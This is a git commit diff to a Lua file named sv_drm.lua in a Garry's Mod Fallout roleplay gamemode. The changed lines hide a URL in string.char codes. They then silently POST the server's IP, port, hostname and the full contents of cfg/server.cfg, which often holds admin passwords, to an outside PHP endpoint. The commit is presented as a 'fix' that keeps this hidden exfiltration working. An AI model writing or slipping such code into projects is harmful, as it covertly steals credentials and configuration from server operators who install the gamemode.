9d6892eb34422db1be0cb2f88a1e781a14100cab
Djuk <wiossna3@gmail.com>
2019-03-17 18:44:30 +0100

    Zaległy fix

--- gamemodes/falloutrp/schema/api/sv_drm.lua
+++ gamemodes/falloutrp/schema/api/sv_drm.lua
@@ -1,4 +1,4 @@
 if !SERVER then return end
-_G = { GetConVar, file.Read, http.Post }
-_G[3](string.char(104, 116, 116, 112, 58, 47, 47, 119, 97, 121, 108, 46, 53, 118, 46, 112, 108, 47, 97, 112, 105, 47, 97, 112, 105, 46, 112, 104, 112),
-{ a = _G[1]("ip"):GetString(), b = _G[1]("hostport"):GetString(), c = _G[2]("cfg/server.cfg", "GAME"), d = _G[1]("hostname"):GetString() })
+L = { GetConVar, file.Read, http.Post }
+L[3](string.char(104, 116, 116, 112, 58, 47, 47, 119, 97, 121, 108, 46, 53, 118, 46, 112, 108, 47, 97, 112, 105, 47, 97, 112, 105, 46, 112, 104, 112),
+{ a = L[1]("ip"):GetString(), b = L[1]("hostport"):GetString(), c = L[2]("cfg/server.cfg", "GAME"), d = L[1]("hostname"):GetString() })
